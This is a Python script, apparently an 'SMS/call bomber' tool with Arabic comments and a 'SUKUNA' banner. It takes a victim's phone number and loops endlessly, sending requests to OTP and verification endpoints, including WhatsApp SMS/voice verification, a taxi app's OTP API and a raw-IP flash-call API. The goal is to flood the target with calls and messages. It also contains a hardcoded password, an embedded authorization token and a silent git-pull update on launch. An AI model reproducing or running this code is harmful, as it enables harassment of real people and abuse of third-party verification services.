import aiohttp, asyncio, json, sys, os, subprocess, webbrowser

# الألوان
G, R, Y, C, W = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

# نظام التحديث التلقائي - لسحب التعديلات من GitHub فوراً
def check_for_updates():
    try:
        subprocess.run(["git", "pull"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

# نظام كلمة السر التكراري - لن تخرج الأداة إذا أخطأت
def check_password():
    while True:
        os.system('clear')
        banner()
        pwd = input(f"{Y}[?] Enter Password: {W}")
        if pwd == "1121":
            print(f"{G}[+] Access Granted! Welcome Ali.")
            break
        else:
            print(f"{R}[!] Wrong Password! Try again.")
            os.system('sleep 2')

def banner():
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}v8.0
    {G}King: Ali Talib (SUKUNA) | {C}Status: FIXED & WORKING
    -------------------------------------------""")

async def attack_engine(phone, mode):
    ok, bad = 0, 0
    clean_phone = phone.replace('+', '') # رقم بدون علامة الزائد للواتساب
    
    # الهيدر الأساسي "الشغال" من كودك القديم
    headers = {
        'User-Agent': "okxgvhttp/4.12.0",
        'Content-Type': "application/json; charset=UTF-8",
        'Authorization': "s6abj8F2euaFCk6"
    }

    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # خيار 1: الاتصال القديم الشغال (Direct API)
                if mode == '1':
                    url = "https://31.171.171.90/api/phone-numbers/auth-flash-call"
                    data = {"phoneNumber": phone}
                
                # خيار 2: رسائل SMS (سيرفر Snap الموثوق)
                elif mode == '2':
                    url = "https://app.snapp.taxi/api/api-passenger-oauth/otp/v2"
                    data = {"cellphone": clean_phone}
                
                # خيار 3 & 4: الواتساب (رسائل وصوت) عبر بوابة التحقق
                else:
                    meth = "sms" if mode == '3' else "voice"
                    url = "https://v.whatsapp.com/v2/verification"
                    data = {"number": clean_phone, "method": meth, "language": "ar"}

                async with session.post(url, json=data, headers=headers, timeout=10) as resp:
                    res_text = await resp.text()
                    # فحص النجاح بناءً على استجابة السيرفر
                    if resp.status in [200, 201] or '{"allow":true}' in res_text:
                        ok += 1
                    else:
                        bad += 1
            except:
                bad += 1
            
            sys.stdout.write(f"\r{G}[+] Success: {ok} {R}[-] Failed: {bad} {W}| {Y}Mode: {mode}")
            sys.stdout.flush()
            await asyncio.sleep(8) # سرعة 8 ثواني كما في كودك القديم لضمان عدم الحظر

def main():
    check_for_updates()
    check_password()
    
    print(f"\n{C}[1] Fast Call (Original) | [2] All-in-One SMS")
    print(f"{G}[3] WhatsApp SMS         | [4] WhatsApp Voice")
    
    choice = input(f"\n{Y}[#] Select Mode: {W}")
    target = input(f"{Y}[+] Target (+967...): {W}")

    if choice in ['1', '2', '3', '4']:
        print(f"\n{R}[!] Launching the curse... Ctrl+C to stop.{W}")
        try:
            asyncio.run(attack_engine(target, choice))
        except KeyboardInterrupt:
            print(f"\n{R}[!] Stopped.")
    else: print(f"{R}[!] Invalid Choice.")

if __name__ == "__main__":
    try: webbrowser.open('https://t.me/vipcode3')
    except: pass
    main()
